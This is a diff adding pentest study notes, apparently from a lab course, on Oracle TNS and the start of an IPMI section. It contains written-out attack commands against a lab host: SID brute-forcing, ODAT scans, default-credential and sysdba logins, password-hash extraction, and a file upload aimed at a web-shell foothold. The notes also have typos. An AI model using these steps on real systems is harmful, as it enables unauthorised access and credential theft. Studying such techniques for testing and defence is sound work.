@@ -931,3 +931,92 @@ LISTENER =
   )
 
 ADR_BASE_LISTENER = C:\oracle
+-in short the client-side Oracle Net Services software uses the tnsnames.ora file to resolve service names to network addresses, while the listener process uses the listener.ora file to determine the services it should listen to and the behavior of the listener
+-ora databases can be protected by using so-called PL/SQL exclusion list (PlsqlExclusionlist). it is a user-created text file that needs to be placed in the $ORACLE_HOME/sqldeveloper dir, it contains the names of PL/SQL packages or types that should be excluded from execution.
+once the PL/SQL exlusion list file is created it can be loaded into the db instance. it serves as a blacklist that cannot be accessed through the oracle application server
+Setting	Description
+DESCRIPTION	A descriptor that provides a name for the database and its connection type.
+ADDRESS	The network address of the database, which includes the hostname and port number.
+PROTOCOL	The network protocol used for communication with the server
+PORT	The port number used for communication with the server
+CONNECT_DATA	Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.
+INSTANCE_NAME	The name of the database instance the client wants to connect.
+SERVICE_NAME	The name of the service that the client wants to connect to.
+SERVER	The type of server used for the database connection, such as dedicated or shared.
+USER	The username used to authenticate with the database server.
+PASSWORD	The password used to authenticate with the database server.
+SECURITY	The type of security for the connection.
+VALIDATE_CERT	Whether to validate the certificate using SSL/TLS.
+SSL_VERSION	The version of SSL/TLS to use for the connection.
+CONNECT_TIMEOUT	The time limit in seconds for the client to establish a connection to the database.
+RECEIVE_TIMEOUT	The time limit in seconds for the client to receive a response from the database.
+SEND_TIMEOUT	The time limit in seconds for the client to send a request to the database.
+SQLNET.EXPIRE_TIME	The time limit in seconds for the client to detect a connection has failed.
+TRACE_LEVEL	The level of tracing for the database connection.
+TRACE_DIRECTORY	The directory where the trace files are stored.
+TRACE_FILE_NAME	The name of the trace file.
+LOG_FILE	The file where the log information is stored.
+-before we can enum the TNS listener and interact with it, we need to download a few packages and tools for our pawnbox instance in case it doe not have these already
+\\Oracle-Tools-setup.sh========================================
+<bash>#!/bin/bash
+
+sudo apt-get install libaio1 python3-dev alien -y
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+git submodule init
+git submodule update
+wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
+unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
+wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
+unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
+export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
+export PATH=$LD_LIBRARY_PATH:$PATH
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+-> check installation status $./odat.py -h 
+-Oracle database attacking tool (ODAT) is an open-source pen.test tool written in python and designed to enum and exploit vul in oracle db. it can be use to identify and exploit various security flaws in Oracle db, including SQL injection, remote code execution, and privilege escalation
+\\Nmap 
+$sudo nmap -p1521 -sV 10.129.204.235 --open
+-in Oracle RDBMS a system identifier (SID) is a unique name that identifies a particular db instance. it can have multi instances, each with its own system ID. an Instance is set pf processes and memory structures that interact to manage the db data.
+-When a client conn to an oracle db, it specifies the db SID along wiwth its conn string. the client uses this SID to identify which db instance it wants to conn to. suppose the client does not specify a SID. then the default value defined in the tnsnames.ora file used
+-The SIDs are an essential part of the conn process, as it identifies the specific instance of the db the client want to connect to. if the client specifies an incorrect SID, the conn attempt will fail. DB admin can use the SID to monitor and manage the idividual instances of a db.
+Ex: they can start, stop or restart an instance. adjust its mem allocation or other config para, and monitor its performance using tools like Oracle Enterprise Manager
+-There are various ways to enumerate, or better said, guess SIDs, therefore we can use tools like nmap, hydra, odat, and others.
+\\Nmap-SID  bruteforcing
+$sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+-> use the odat.py tool to perform a variety of scans to enum and gather infor about the oracle db services and its components. those scans can retrieve db names,version, running processes, user account, vul, misconfig, etc, 
+\\ODAT
+$./odat.py all -s 10.129.204.235
+-> we found valid account scott and password tiger -> use sqlplus to conn to the Oracle db and interact with it
+\\SQLplus - login
+$sqlplus scoot/tiger@10.129.204.235/XE
+If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below, taken from
+https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
+$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+\\SQLplus commands: https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985
+to enum db manually : SQL> select table_name from all_tables;
+-> SQL> select * from user_role_privs;
+try to access sysdba giving higher privileges. this possible when user has the appropriate privileges typically granted by the db administrator or used by the admin
+\\Oracle RDBMS - Database Enumeration
+$sqlplus scott/tiger@10.129.204.235/XE as sysdba
+SQL> select * from user_role_privs;
+->retrive the password hashes from the sys.user$ and try to crack them offline 
+\\Oracle RDBMS-Extract Password hashes
+$select name, password from sys.user$;
+another option it to upload a web shell to the target.hower this requires the server to run a web server, and we need to know the exact location of the root dir for the websvr. nevertheless, if we know what type of system we are dealing with, try the default paths
+OS	Path
+Linux	/var/www/html
+Windows	C:\inetpub\wwwroot
+1st try to exploitation approach with files that donot look dangerous for AV or instrusion detection/prevention systems is always important. therefore we create a text file with a string and use it to upload to the target system.
+\\Oracle RDBMS - File upload
+$echo "Oracle File Upload Test" > testing.txt
+$./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+finally we can test if the file upload approach worked with curl. therefore we will use a GET http://<ip> request
+$curl -X GET http://10.129.204.235/testing.txt
+
+\\IPMI=====================================================================
+Intelligent Platform Management Interface is a set of standardized specifications for hardware-based host management systems used to system management and monitoring. it acts as an autonomous subsystem and works independently of the host's BIOS,CPU, firmware and underlying OS.
+-IPMI provides sysadmins wih the ability to manage and monitor systems even if they are powered off or in an unresponsive state.
